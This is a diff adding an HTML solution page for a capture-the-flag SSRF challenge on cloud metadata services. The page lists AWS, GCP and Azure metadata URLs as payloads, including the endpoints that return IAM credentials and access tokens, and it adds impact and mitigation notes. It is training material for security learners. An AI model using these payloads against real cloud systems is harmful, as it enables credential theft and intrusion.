@@ -1,0 +1,88 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 3 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 3 Solution: Cloud Metadata SSRF</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF exploitation against cloud metadata services, which is one of the most critical SSRF attack vectors in cloud environments.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Identify cloud environment:</strong> The service runs on a cloud instance</li>
+                    <li><strong>Target metadata endpoints:</strong> Try cloud-specific metadata URLs:
+                        <ul>
+                            <li><strong>AWS:</strong> <code>http://169.254.169.254/latest/meta-data/</code></li>
+                            <li><strong>GCP:</strong> <code>http://metadata.google.internal/computeMetadata/v1/</code></li>
+                            <li><strong>Azure:</strong> <code>http://169.254.169.254/metadata/instance</code></li>
+                        </ul>
+                    </li>
+                    <li><strong>Extract sensitive data:</strong> Access credentials, instance info, and security tokens</li>
+                    <li><strong>Retrieve the flag:</strong> The flag is revealed when accessing metadata services</li>
+                </ol>
+
+                <h4>Payload Examples:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># AWS EC2 Metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Google Cloud Metadata
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure Metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token</code></pre>
+                    </div>
+                </div>
+
+                <h4>Technical Details:</h4>
+                <p>Cloud metadata services provide:</p>
+                <ul>
+                    <li>Instance information and configuration</li>
+                    <li>IAM credentials and access tokens</li>
+                    <li>Network configuration details</li>
+                    <li>Security group and firewall rules</li>
+                    <li>User data and startup scripts</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Complete compromise of cloud instance credentials</li>
+                    <li>Lateral movement within cloud infrastructure</li>
+                    <li>Access to other cloud services and resources</li>
+                    <li>Potential for privilege escalation</li>
+                    <li>Data exfiltration from cloud storage</li>
+                </ul>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Block access to 169.254.169.254 and metadata.google.internal</li>
+                    <li>Use IMDSv2 (AWS) with token-based authentication</li>
+                    <li>Implement network-level filtering</li>
+                    <li>Use least-privilege IAM policies</li>
+                    <li>Enable cloud security monitoring</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Critical Security Note</h5>
+                    <p class="mb-0">Cloud metadata SSRF is one of the most dangerous vulnerabilities in cloud environments. It can lead to complete infrastructure compromise and should be treated as a critical security issue.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level3" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level4" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
